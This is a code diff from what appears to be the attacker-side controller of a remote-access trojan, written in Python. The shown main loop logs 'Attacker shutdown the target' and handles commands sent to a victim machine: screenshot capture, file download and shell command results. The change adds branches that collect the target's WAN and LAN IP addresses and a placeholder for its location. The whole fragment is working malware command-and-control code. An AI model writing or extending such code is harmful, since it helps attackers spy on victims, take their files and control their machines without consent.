@@ -148,7 +148,7 @@ def main():
                             logger.info("Attacker shutdown the target...")
                             shutdown = True
                             break
-                        if rl_cmd == command.Command.SCREENSHOT.value:
+                        elif rl_cmd == command.Command.SCREENSHOT.value:
                             # Check if there are image filename argument.
                             if params_len >= 1:
                                 ss_filename = params[0]
@@ -166,12 +166,20 @@ def main():
 
                             logger.info(f"Image saved! => {ss_filename}")
 
-                        if rl_cmd == command.Command.DOWNLOAD.value:
-                            result = conn.recv(constant.BUF_SIZE)
-                            msg = handler.decode(result)
-
+                        elif rl_cmd == command.Command.DOWNLOAD.value:
+                            msg = handler.decode_msg(conn)
                             logger.info(msg)
 
+                        elif rl_cmd == command.Command.WAN_IP.value:
+                            wan_ip = handler.decode_msg(conn)
+                            logger.info(f"Target {addr} WAN:IP => {wan_ip}")
+
+                        elif rl_cmd == command.Command.LAN_IP.value:
+                            lan_ip = handler.decode_msg(conn)
+                            logger.info(f"Target {addr} LAN:IP => {lan_ip}")
+
+                        elif rl_cmd == command.Command.LOCATION.value:
+                            pass
                     # Check regular shell command.
                     else:
                         # Receive shell command result.
